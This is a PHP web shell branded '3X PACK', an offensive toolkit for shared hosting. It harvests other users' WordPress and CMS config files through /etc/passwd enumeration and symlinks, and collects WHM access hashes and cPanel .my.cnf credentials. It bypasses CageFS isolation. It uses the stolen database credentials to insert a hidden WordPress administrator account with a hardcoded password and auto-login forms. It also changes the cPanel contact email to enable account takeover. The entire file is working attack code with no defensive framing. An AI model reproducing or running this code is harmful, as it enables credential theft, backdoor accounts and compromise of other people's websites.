
<?php
// --- PERFORMANCE TUNING ---
error_reporting(0);
@ini_set('display_errors', 0);
@ini_set('log_errors', 0);
@ini_set('memory_limit', '-1');
@set_time_limit(0);
session_start();

$name = "3x";
$sexy = "default_key"; 
$_SESSION[md5($sexy)] = "true";

// --- MULTI-HOME CONFIG ---
$home_dirs = array('/home');
for ($i = 1; $i <= 9; $i++) {
    $home_dirs[] = '/home' . $i;
}

// --- ULTIMATE FALLBACK FUNCTIONS ---

function x_read($path) {
    if (is_readable($path)) return @file_get_contents($path);
    if (function_exists('file')) { $f = @file($path); if ($f) return implode("", $f); }
    if (function_exists('fopen')) { $h = @fopen($path, "r"); if ($h) { $c = @fread($h, filesize($path)); fclose($h); return $c; } }
    if (function_exists('shell_exec')) return @shell_exec("cat '$path'");
    return false;
}

function x_write($path, $data) {
    if (@file_put_contents($path, $data)) return true;
    if (function_exists('fopen')) { $h = @fopen($path, "w"); if ($h) { fwrite($h, $data); fclose($h); return true; } }
    $d = str_replace("'", "'\"'\"'", $data);
    if (function_exists('shell_exec')) { @shell_exec("echo '$d' > '$path'"); return file_exists($path); }
    return false;
}

function x_link($target, $link) {
    if (function_exists('symlink')) @symlink($target, $link);
    elseif (function_exists('shell_exec')) @shell_exec("ln -s '$target' '$link'");
}

function x_request($url) {
    $c = false;
    if (function_exists('curl_init')) {
        $ch = curl_init($url);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
        curl_setopt($ch, CURLOPT_TIMEOUT, 5);
        $c = curl_exec($ch);
        curl_close($ch);
    }
    if (!$c && ini_get('allow_url_fopen')) $c = @file_get_contents($url);
    return $c;
}

// --- TOOL LOGIC ---
function run_tool($tool) {
    global $home_dirs;
    
    // SYMLINKER
    if ($tool == "Symlinker") {
        if ($_POST["start"]) {
            $dir = @file("/etc/passwd");
            if (!$dir) $dir = explode("\n", x_read("/etc/passwd"));
            
            if(!is_dir("3x_sym")) mkdir("3x_sym", 0755);
            chdir("3x_sym");
            x_write(".htaccess", "Options Indexes FollowSymLinks\nDirectoryIndex achon666ju5t.extremecrew\nAddType txt .php\nAddHandler txt .php");
            
            $list = ["wp-config.php", "config.php", "configuration.php", "sites/default/settings.php", "whm/configuration.php", "whmcs/configuration.php"];
            $count = 0;
            if(is_array($dir)){
                foreach ($dir as $u_str) {
                    $u = explode(":", $u_str)[0];
                    if(empty($u)) continue;
                    foreach ($home_dirs as $home) {
                        if (!is_dir("$home/$u")) continue;
                        foreach ($list as $conf) {
                            x_link("$home/$u/public_html/$conf", "$u~" . str_replace("/", "-", $conf) . ".txt");
                            $count++;
                        }
                    }
                }
            }
            return "<div class='msg success'>Symlinked $count files. <a href='3x_sym' target='_blank'>OPEN DIR</a></div>";
        }
        return '<form method="POST"><button type="submit" name="start" value="1" class="btn-action">RUN SYMLINKER</button></form>';
    }

    // CAGEFS SYMLINKER
    if ($tool == "CageFS Symlinker") {
        if ($_POST["start"]) {
            $c = x_read(getcwd() . "/passwd.txt");
            if(!$c) return "<div class='msg error'>passwd.txt not found.</div>";
            $dir = explode("\n", $c);
            
            if(!is_dir("3x_sym")) mkdir("3x_sym", 0755);
            chdir("3x_sym");
            x_write(".htaccess", "Options Indexes FollowSymLinks\nDirectoryIndex achon666ju5t.extremecrew\nAddType txt .php\nAddHandler txt .php");
            
            $list = ["wp-config.php", "config.php", "configuration.php"];
            $count = 0;
            foreach ($dir as $u_str) {
                $u = explode(":", $u_str)[0];
                if(empty($u)) continue;
                foreach ($home_dirs as $home) {
                    if (!is_dir("$home/$u")) continue;
                    foreach ($list as $conf) {
                        x_link("$home/$u/public_html/$conf", "$u~" . str_replace("/", "-", $conf) . ".txt");
                        $count++;
                    }
                }
            }
            return "<div class='msg success'>Symlinked $count files. <a href='3x_sym' target='_blank'>OPEN DIR</a></div>";
        }
        return '<form method="POST"><button type="submit" name="start" value="1" class="btn-action">RUN CAGEFS SYM</button></form>';
    }

    // JUMPER
    if ($tool == "Jumper") {
        if (isset($_POST['scan'])) {
            $list = ["wp-config.php", "config.php", "configuration.php"];
            $c = x_read("/etc/passwd");
            if (!$c) return "<div class='msg error'>Err: /etc/passwd</div>";
            $users = explode("\n", $c);
            
            if(!is_dir("jumping")) mkdir("jumping", 0755);
            chdir("jumping");
            x_write(".htaccess", "Options Indexes FollowSymLinks\nDirectoryIndex achon666ju5t.extremecrew\nAddType txt .php\nAddHandler txt .php");
            
            $count = 0;
            foreach ($users as $u_str) {
                $u = explode(":", $u_str)[0];
                if(empty($u)) continue;
                foreach ($home_dirs as $home) {
                    if (!is_dir("$home/$u")) continue; 
                    foreach ($list as $url) {
                        $get = x_read("$home/$u/public_html/$url"); 
                        if($get) {
                            $clean_home = str_replace('/', '', $home);
                            x_write("$u~$clean_home~" . str_replace("/","-",$url) . ".txt", $get);
                            $count++;
                        }
                    }
                }
            }
            return "<div class='msg success'>Jumper Found: $count. <a href='jumping' target='_blank'>OPEN DIR</a></div>";
        }
        return '<form method="POST"><button type="submit" name="scan" value="1" class="btn-action">RUN JUMPER</button></form>';
    }

    // CAGEFS JUMPER
    if ($tool == "CageFS Jumper") {
        if (isset($_POST['scan'])) {
            $list = ["wp-config.php", "config.php", "configuration.php"];
            $c = x_read(getcwd() . "/passwd.txt");
            if (!$c) return "<div class='msg error'>passwd.txt empty</div>";
            $users = explode("\n", $c);
            
            if(!is_dir("jumping")) mkdir("jumping", 0755);
            chdir("jumping");
            x_write(".htaccess", "Options Indexes FollowSymLinks\nDirectoryIndex achon666ju5t.extremecrew\nAddType txt .php\nAddHandler txt .php");
            
            $count = 0;
            foreach ($users as $u_str) {
                $u = explode(":", $u_str)[0];
                if(empty($u)) continue;
                foreach ($home_dirs as $home) {
                    if (!is_dir("$home/$u")) continue;
                    foreach ($list as $url) {
                        $get = x_read("$home/$u/public_html/$url");
                        if($get){
                            $clean_home = str_replace('/', '', $home);
                            x_write("$u~$clean_home~" . str_replace("/","-",$url) . ".txt", $get);
                            $count++;
                        }
                    }
                }
            }
            return "<div class='msg success'>CageFS Found: $count. <a href='jumping' target='_blank'>OPEN DIR</a></div>";
        }
        return '<form method="POST"><button type="submit" name="scan" value="1" class="btn-action">RUN CAGEFS JUMP</button></form>';
    }

    // CAGEFS BYPASSER
    if ($tool == "CageFS Bypasser") {
        if ($_POST["scan"]) {
            $found = "";
            $etc = x_read("/etc/passwd");
            if ($etc) {
                $lines = explode("\n", $etc);
                foreach($lines as $l) { $p = explode(":", $l); if(isset($p[0]) && !empty($p[0])) $found .= $p[0] . ":\n"; }
            } else {
                for ($userid = 0; $userid < 2000; $userid++) {
                    $arr = posix_getpwuid($userid);
                    if (!empty($arr) && isset($arr['name'])) $found .= $arr['name'] . ":\n";
                }
            }
            x_write("passwd.txt", $found);
            return "<div class='msg success'>Extracted. <a href='passwd.txt' target='_blank'>VIEW FILE</a></div>";
        }
        return '<form method="POST"><button type="submit" name="scan" value="1" class="btn-action">RUN BYPASS</button></form>';
    }

    // ACCESS HASH
    if ($tool == "Access Hash Finder") {
        if ($_POST["start"]) {
            $names = explode("\n", x_read("/etc/passwd"));
            if(!is_dir("3x_hashes")) mkdir("3x_hashes", 0755);
            chdir("3x_hashes");
            $out = "<div class='list-mini'>"; $count = 0;
            if (is_array($names)) {
                foreach ($names as $n) {
                    $u = explode(":", $n)[0]; if(empty($u)) continue;
                    foreach ($home_dirs as $home) {
                        if (!is_dir("$home/$u")) continue;
                        $get = x_read("$home/$u/.accesshash");
                        if ($get) {
                            $count++;
                            $fn = "$u~accesshash.txt";
                            x_write($fn, "WHM $u:" . str_replace("\n", "", $get));
                            $out .= "<div><small>GOT:</small> <a href='3x_hashes/$fn' target='_blank'>$fn</a></div>";
                        }
                    }
                }
                return $out . "</div>";
            }
        }
        return '<form method="POST"><button type="submit" name="start" value="1" class="btn-action">SCAN HASHES</button></form>';
    }

    // CAGEFS HASH
    if ($tool == "CageFS Access Hash Finder") {
        if ($_POST["start"]) {
            $names = explode("\n", x_read(getcwd()."/passwd.txt"));
            if(!is_dir("3x_hashes")) mkdir("3x_hashes", 0755);
            chdir("3x_hashes");
            $out = "<div class='list-mini'>"; $count = 0;
            if (is_array($names)) {
                foreach ($names as $n) {
                    $u = explode(":", $n)[0]; if(empty($u)) continue;
                    foreach ($home_dirs as $home) {
                        if (!is_dir("$home/$u")) continue;
                        $get = x_read("$home/$u/.accesshash");
                        if ($get) {
                            $count++;
                            $fn = "$u~accesshash.txt";
                            x_write($fn, "WHM $u:" . str_replace("\n", "", $get));
                            $out .= "<div><small>GOT:</small> <a href='3x_hashes/$fn' target='_blank'>$fn</a></div>";
                        }
                    }
                }
                return $out . "</div>";
            }
        }
        return '<form method="POST"><button type="submit" name="start" value="1" class="btn-action">SCAN CAGEFS HASH</button></form>';
    }

    // CP FINDER
    if ($tool == "Automatic CP Finder") {
        if ($_POST["start"]) {
            $names = explode("\n", x_read("/etc/passwd"));
            if(!is_dir("3x_cps")) mkdir("3x_cps", 0755);
            chdir("3x_cps");
            $out = "<div class='list-mini'>";
            if (is_array($names)) {
                foreach ($names as $n) {
                    $u = explode(":", $n)[0]; if(empty($u)) continue;
                    foreach ($home_dirs as $home) {
                        if (!is_dir("$home/$u")) continue;
                        $get = x_read("$home/$u/.my.cnf");
                        if ($get) {
                            $fn = "$u~cpanel.txt";
                            x_write($fn, $get);
                            $out .= "<div><small>GOT:</small> <a href='3x_cps/$fn' target='_blank'>$fn</a></div>";
                        }
                    }
                }
                return $out . "</div>";
            }
        }
        return '<form method="POST"><button type="submit" name="start" value="1" class="btn-action">SCAN CP</button></form>';
    }

    // CAGEFS CP
    if ($tool == "CageFS Automatic CP Finder") {
        if ($_POST["start"]) {
            $names = explode("\n", x_read(getcwd()."/passwd.txt"));
            if(!is_dir("3x_cps")) mkdir("3x_cps", 0755);
            chdir("3x_cps");
            $out = "<div class='list-mini'>";
            if (is_array($names)) {
                foreach ($names as $n) {
                    $u = explode(":", $n)[0]; if(empty($u)) continue;
                    foreach ($home_dirs as $home) {
                        if (!is_dir("$home/$u")) continue;
                        $get = x_read("$home/$u/.my.cnf");
                        if ($get) {
                            $fn = "$u~cpanel.txt";
                            x_write($fn, $get);
                            $out .= "<div><small>GOT:</small> <a href='3x_cps/$fn' target='_blank'>$fn</a></div>";
                        }
                    }
                }
                return $out . "</div>";
            }
        }
        return '<form method="POST"><button type="submit" name="start" value="1" class="btn-action">SCAN CAGEFS CP</button></form>';
    }

// ADD ADMIN (FINAL: DOMAIN NAME DISPLAY + WHITE TEXT)
    if ($tool == "Add Admin") {
        // [STYLE INJECTION]
        echo "<style>
            .inj-list { display: flex; flex-direction: column; gap: 8px; margin-top: 15px; }
            .inj-card {
                background: #0a0a0a;
                border: 1px solid #222;
                border-left: 3px solid #333;
                padding: 12px;
                border-radius: 4px;
                transition: all 0.2s ease;
                display: flex;
                flex-direction: column;
                gap: 6px;
                font-family: 'Roboto Mono', monospace;
                font-size: 11px;
                position: relative;
            }
            .inj-card:hover {
                border-color: #333;
                border-left-color: #00ff00; /* Lime Accent */
                box-shadow: 0 0 10px rgba(0, 255, 0, 0.1);
                background: #0f0f0f;
                transform: translateX(3px);
            }
            .inj-header { display: flex; justify-content: space-between; align-items: center; }
            
            /* STATUS BADGES */
            .inj-status { font-weight: bold; font-size: 10px; text-transform: uppercase; letter-spacing: 1px; padding: 2px 6px; border-radius: 3px; }
            .inj-status.created { background: rgba(46, 204, 113, 0.1); color: #2ecc71; border: 1px solid rgba(46, 204, 113, 0.2); }
            .inj-status.replaced { background: rgba(243, 156, 18, 0.1); color: #f39c12; border: 1px solid rgba(243, 156, 18, 0.2); }
            
            /* DOMAIN TEXT (WHITE) */
            .inj-domain { 
                color: #ffffff; /* REQUEST: WHITE TEXT */
                font-size: 11px; 
                font-weight: bold;
                letter-spacing: 0.5px;
            }

            .inj-body { display: flex; align-items: center; gap: 10px; flex-wrap: wrap; margin-top: 4px; }
            
            /* BUTTON STYLES */
            .inj-btn {
                background: #27ae60;
                color: #fff;
                border: none;
                padding: 5px 12px;
                border-radius: 3px;
                font-weight: bold;
                font-size: 10px;
                cursor: pointer;
                text-transform: uppercase;
                display: inline-flex; align-items: center; gap: 5px;
                transition: 0.2s;
            }
            .inj-btn:hover { background: #00ff00; color:#000; box-shadow: 0 0 8px #00ff00; }
            
            /* CREDENTIAL BOX */
            .inj-creds { background: #151515; padding: 4px 8px; border: 1px solid #333; border-radius: 3px; color: #aaa; display: flex; align-items: center; gap: 8px; }
            .inj-creds b { color: #fff; }
            .pass-box { background: transparent; border: none; color: #fff; width: 80px; font-family: monospace; font-size: 10px; text-align: center; cursor: pointer; outline: none; }
            .pass-box:hover { color: #00ff00; text-decoration: underline; }
        </style>";

        if (isset($_POST["start"]) || isset($_GET['step'])) {
            
            // Server Config
            @ini_set('output_buffering', 'off');
            @ini_set('zlib.output_compression', false);
            @ini_set('implicit_flush', true);
            @ob_end_clean();
            @set_time_limit(0);

            // Params
            $path = isset($_POST['path']) ? $_POST['path'] : (isset($_GET['path']) ? $_GET['path'] : '');
            $step = isset($_GET['step']) ? (int)$_GET['step'] : 0;
            $limit = 5; 
            $log_file = "injector_result.html"; 

            if(substr($path, -1) != '/') $path .= '/';

            // Reset Log
            if ($step == 0) {
                if (file_exists($log_file)) @unlink($log_file);
                file_put_contents($log_file, "<div class='inj-list'>");
            }

            // Scan Files
            $all_files = @scandir($path);
            if (!$all_files) $all_files = glob($path . "*");
            
            $config_files = [];
            foreach($all_files as $f) {
                if($f == '.' || $f == '..') continue;
                if(stripos($f, 'config') !== false || stripos($f, 'settings') !== false) {
                    $config_files[] = $f;
                }
            }
            $total_files = count($config_files);
            $batch_files = array_slice($config_files, $step, $limit);

            $next_step = $step + $limit;
            $next_url = "?tool=Add+Admin&step=$next_step&path=" . urlencode($path);

            // Console Header
            echo "<div class='console' style='background:#000; color:#ccc; font-family:monospace; font-size:12px; padding:10px;'>";
            
            if ($next_step < $total_files) {
                echo "<script>
                        var watchdog = setTimeout(function(){
                            document.getElementById('status_msg').innerHTML = '[!] Server Hang. Auto-Jumping...';
                            window.location.href = '$next_url';
                        }, 10000); 
                      </script>";
            }

            echo "<div id='status_msg'>[+] Processing batch $step - ".($step+count($batch_files))." of $total_files...</div><hr>";
            flush();

            // Process Batch
            foreach($batch_files as $file) {
                $full = $path . $file;
                $content = x_read($full);
                if(!$content) continue;

                // Regex Creds
                if (!preg_match("/define\s*\(\s*['\"]DB_NAME['\"]\s*,\s*['\"](.*?)['\"]\s*\)/i", $content, $m_name)) continue;
                if (!preg_match("/define\s*\(\s*['\"]DB_USER['\"]\s*,\s*['\"](.*?)['\"]\s*\)/i", $content, $m_user)) continue;
                if (!preg_match("/define\s*\(\s*['\"]DB_PASSWORD['\"]\s*,\s*['\"](.*?)['\"]\s*\)/i", $content, $m_pass)) $m_pass[1] = "";
                if (!preg_match("/define\s*\(\s*['\"]DB_HOST['\"]\s*,\s*['\"](.*?)['\"]\s*\)/i", $content, $m_host)) $m_host[1] = "localhost";
                
                $db_name = $m_name[1]; $db_user = $m_user[1]; $db_pass = $m_pass[1]; $db_host = $m_host[1];
                if (preg_match("/table_prefix\s*=\s*['\"](.*?)['\"]/", $content, $m_pre)) $pre = $m_pre[1]; else $pre = "wp_";

                $new_u = "xshikata"; $new_p_raw = "Wh0th3h3llAmi"; $new_p_hash = md5($new_p_raw); $new_email = "support@wordpress.com";

                // DB Connect
                $link = mysqli_init();
                mysqli_options($link, MYSQLI_OPT_CONNECT_TIMEOUT, 3);
                $con = @mysqli_real_connect($link, $db_host, $db_user, $db_pass, $db_name);
                if (!$con && $db_host == 'localhost') {
                    $link = mysqli_init();
                    mysqli_options($link, MYSQLI_OPT_CONNECT_TIMEOUT, 3);
                    $con = @mysqli_real_connect($link, '127.0.0.1', $db_user, $db_pass, $db_name);
                }

                if ($con) {
                    $site_url = "";
                    $q = @mysqli_query($link, "SELECT option_value FROM {$pre}options WHERE option_name='siteurl' LIMIT 1");
                    if ($q && $r = @mysqli_fetch_assoc($q)) $site_url = $r['option_value'];

                    // Logic Replace / Create
                    $chk = @mysqli_query($link, "SELECT ID FROM {$pre}users WHERE user_login='$new_u'");
                    $status_class = "created";
                    $status_text = "CREATED";
                    
                    if ($chk && @mysqli_num_rows($chk) > 0) {
                        $old = @mysqli_fetch_assoc($chk);
                        @mysqli_query($link, "DELETE FROM {$pre}users WHERE ID = " . $old['ID']);
                        @mysqli_query($link, "DELETE FROM {$pre}usermeta WHERE user_id = " . $old['ID']);
                        $status_class = "replaced";
                        $status_text = "REPLACED";
                    }

                    $ins = @mysqli_query($link, "INSERT INTO {$pre}users (user_login, user_pass, user_nicename, user_email, user_registered, user_status, display_name) VALUES ('$new_u', '$new_p_hash', '$new_u', '$new_email', NOW(), 0, '$new_u')");
                    
                    if ($ins) {
                        $uid = @mysqli_insert_id($link);
                        @mysqli_query($link, "INSERT INTO {$pre}usermeta (user_id, meta_key, meta_value) VALUES ($uid, '{$pre}capabilities', 'a:1:{s:13:\"administrator\";b:1;}')");
                        @mysqli_query($link, "INSERT INTO {$pre}usermeta (user_id, meta_key, meta_value) VALUES ($uid, '{$pre}user_level', '10')");
                        
                        // [DOMAIN DISPLAY LOGIC]
                        $display_host = parse_url($site_url, PHP_URL_HOST);
                        if(!$display_host) $display_host = $site_url; // Fallback jika parse gagal

                        // Force HTTPS for Action
                        $action_url = $site_url . '/wp-login.php';
                        if (substr($action_url, 0, 7) == 'http://') {
                            $action_url = str_replace('http://', 'https://', $action_url);
                        }

                        $form_btn = "<form action='$action_url' method='post' target='_blank' style='margin:0;'>
                                        <input type='hidden' name='log' value='$new_u'>
                                        <input type='hidden' name='pwd' value='$new_p_raw'>
                                        <input type='hidden' name='redirect_to' value='$site_url/wp-admin/plugin-install.php?s=file&tab=search&type=term'>
                                        <input type='hidden' name='rememberme' value='forever'>
                                        <button type='submit' class='inj-btn'>
                                            <i class='fas fa-sign-in-alt'></i> AUTO LOGIN
                                        </button>
                                     </form>";

                        // Simple Console Output
                        echo "<div style='font-size:10px; color:#555'>[$status_text] $display_host</div>";
                        
                        // [CARD OUTPUT TO LOG]
                        $log_entry = "
                        <div class='inj-card'>
                            <div class='inj-header'>
                                <span class='inj-status $status_class'>$status_text</span>
                                <span class='inj-domain'>$display_host</span>
                            </div>
                            <div class='inj-body'>
                                $form_btn
                                <div class='inj-creds'>
                                    <span>U: <b>$new_u</b></span>
                                    <span style='color:#444'>|</span>
                                    <span>P: <input type='text' value='$new_p_raw' class='pass-box' onclick='this.select();document.execCommand(\"copy\")' title='Click to Copy' readonly></span>
                                </div>
                            </div>
                        </div>";
                        
                        file_put_contents($log_file, $log_entry, FILE_APPEND);
                    }
                    @mysqli_close($link);
                    flush();
                }
            }

            // Redirect / End
            if ($next_step < $total_files) {
                echo "<script>
                        clearTimeout(watchdog);
                        window.location.href = '$next_url';
                      </script>";
                echo "<div style='margin-top:10px; color:#2ecc71'>[>>] Batch Done. Loading next...</div>";
            } else {
                echo "<script>clearTimeout(watchdog);</script>";
                echo "<hr><h2 style='color:#2ecc71'>[+] JOB FINISHED!</h2>";
                echo "<div style='margin-top:20px;'>";
                
                if (file_exists($log_file)) {
                    file_put_contents($log_file, "</div>", FILE_APPEND);
                    echo file_get_contents($log_file);
                } else {
                    echo "Log file not found.";
                }
                echo "</div>";
            }
            
            echo "</div>";
            return ""; 
        }
        return '<form method="POST"><input type="text" name="path" class="mini-input" value="'.getcwd().'/jumping" placeholder="Path to Configs"><button type="submit" name="start" value="1" class="btn-action">START INJECT & AUTO LOGIN</button></form>';
    }

    // EMAIL CHANGE
    if ($tool == "Contactemail Changer") {
        if ($_POST['go']) {
            $u = get_current_user();
            foreach($home_dirs as $home) { if(is_dir("$home/$u")) { $p = "$home/$u/"; break; } }
            if(isset($p)) {
                chdir($p.".cpanel"); @unlink("contactinfo"); chdir(".."); @unlink(".contactemail");
                x_write(".contactemail", $_POST['mail']);
                return "<div class='msg success'>Changed! Try Reset Password.</div>";
            }
        }
        return '<form method="post"><input type="text" name="mail" class="mini-input" placeholder="Email"><button type="submit" name="go" value="1" class="btn-action">CHANGE</button></form>';
    }
    return "";
}

$current_tool = isset($_GET["tool"]) ? $_GET["tool"] : "";
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>3X COMPACT</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <link href="https://fonts.googleapis.com/css2?family=Roboto+Mono:wght@400;600&display=swap" rel="stylesheet">
    <style>
        :root { --bg:#050505; --card:#101010; --border:#222; --accent:#eee; --text:#888; --suc:#2ecc71; --err:#e74c3c; }
        *{margin:0;padding:0;box-sizing:border-box}
        body{background:var(--bg);color:var(--text);font-family:'Roboto Mono',monospace;font-size:11px;padding:10px;display:flex;justify-content:center}
        .wrap{width:100%;max-width:800px}
        header{display:flex;justify-content:space-between;align-items:center;padding:10px;border-bottom:1px solid var(--border);margin-bottom:15px}
        h1{color:#fff;font-size:14px}
        .tag{background:var(--card);padding:3px 6px;border:1px solid var(--border);font-size:10px;color:#555}
        .grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(130px,1fr));gap:8px;margin-bottom:20px}
        .card{background:var(--card);border:1px solid var(--border);color:#666;padding:10px;text-align:center;cursor:pointer;border-radius:4px;height:70px;display:flex;flex-direction:column;justify-content:center;align-items:center;transition:0.2s}
        .card:hover,.card.active{border-color:#444;color:#fff;background:#151515}
        .card i{font-size:18px;margin-bottom:5px;color:#444}
        .card:hover i,.card.active i{color:#fff}
        .console{background:var(--card);border:1px solid var(--border);padding:15px;border-radius:4px}
        .btn-action{background:#fff;color:#000;border:none;width:100%;padding:8px;font:inherit;font-weight:bold;cursor:pointer;border-radius:3px}
        .mini-input{width:100%;background:#000;border:1px solid var(--border);padding:8px;color:#fff;margin-bottom:8px;font:inherit;outline:none}
        .mini-input:focus{border-color:#555}
        .msg{padding:10px;margin-top:5px;border:1px solid transparent}
        .msg.success{background:rgba(46,204,113,0.1);color:var(--suc);border-color:rgba(46,204,113,0.2)}
        .msg.error{background:rgba(231,76,60,0.1);color:var(--err);border-color:rgba(231,76,60,0.2)}
        .list-mini{display:flex;flex-direction:column;gap:4px;max-height:250px;overflow-y:auto}
        .list-mini div{background:#000;padding:5px;border:1px solid var(--border);display:flex;justify-content:space-between}
        a{color:#888;text-decoration:none}a:hover{color:#fff}
    </style>
</head>
<body>
<div class="wrap">
    <header><h1>3X PACK</h1><div class="tag"><i class="fas fa-server"></i> <?= $_SERVER['HTTP_HOST'] ?></div></header>
    <form method="GET" class="grid">
        <?php 
        $tools = [
            'Symlinker'=>'link', 'CageFS Symlinker'=>'project-diagram', 'Jumper'=>'frog', 
            'CageFS Jumper'=>'box-open', 'CageFS Bypasser'=>'user-slash', 
            'Access Hash Finder'=>'key', 'CageFS Access Hash Finder'=>'fingerprint',
            'Automatic CP Finder'=>'search', 'CageFS Automatic CP Finder'=>'network-wired',
            'Contactemail Changer'=>'at', 'Add Admin'=>'user-plus'
        ];
        foreach($tools as $name => $icon) {
            $act = ($current_tool == $name) ? 'active' : '';
            echo "<button type='submit' name='tool' value='$name' class='card $act'><i class='fas fa-$icon'></i><span>$name</span></button>";
        }
        ?>
    </form>
    <?php if($current_tool): ?>
    <div class="console">
        <div style="border-bottom:1px solid #222;padding-bottom:8px;margin-bottom:10px;font-weight:bold;color:#fff">> <?= strtoupper($current_tool) ?></div>
        <?= run_tool($current_tool) ?>
    </div>
    <?php endif; ?>
    <footer style="text-align:center;margin-top:30px;font-size:10px;color:#333">3XP1R3 PR1NC3</footer>
</div>
</body>
</html>
